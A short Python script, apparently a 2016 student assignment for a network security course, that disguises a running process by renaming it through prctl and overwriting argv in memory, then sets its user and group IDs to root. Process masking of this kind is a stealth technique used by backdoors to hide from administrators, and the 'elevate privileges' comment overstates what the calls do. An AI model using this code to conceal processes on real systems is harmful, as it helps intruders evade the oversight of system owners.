#! /usr/bin/env python
# -*- coding: utf-8 -*-

# Mario Enriquez, 2016. COMP 8505 Assignment 3
#
# Based on procname.py by Tom SF Haines.
# Masks the process name in psauxw and in prctl
#

from ctypes import *
import sys
import os

def maskName(name): #function to mask a name
  libc = cdll.LoadLibrary('libc.so.6')
  libc.prctl(15, c_char_p(name), 0, 0, 0) #mask with prct so that the process changes name

  # Update argv...
  charPP = POINTER(POINTER(c_char))
  argv = charPP.in_dll(libc,'_dl_argv')
  size = libc.strlen(argv[0])
  argc=len(sys.argv)+1
  namesize=len(name)
  nameposition=0
  for num in range(0,argc): #empty arguments and replace them with empty space if needed
    if nameposition < namesize:
      argsize=libc.strlen(argv[num])
      libc.strncpy(argv[num],c_char_p(name[nameposition:nameposition+argsize+1]),argsize+1)
      nameposition+=argsize+1
    else:
      libc.strncpy(argv[num],c_char_p(""),libc.strlen(argv[num]))
  os.setuid(0) #elevate privileges
  os.setgid(0) #elevate privileges

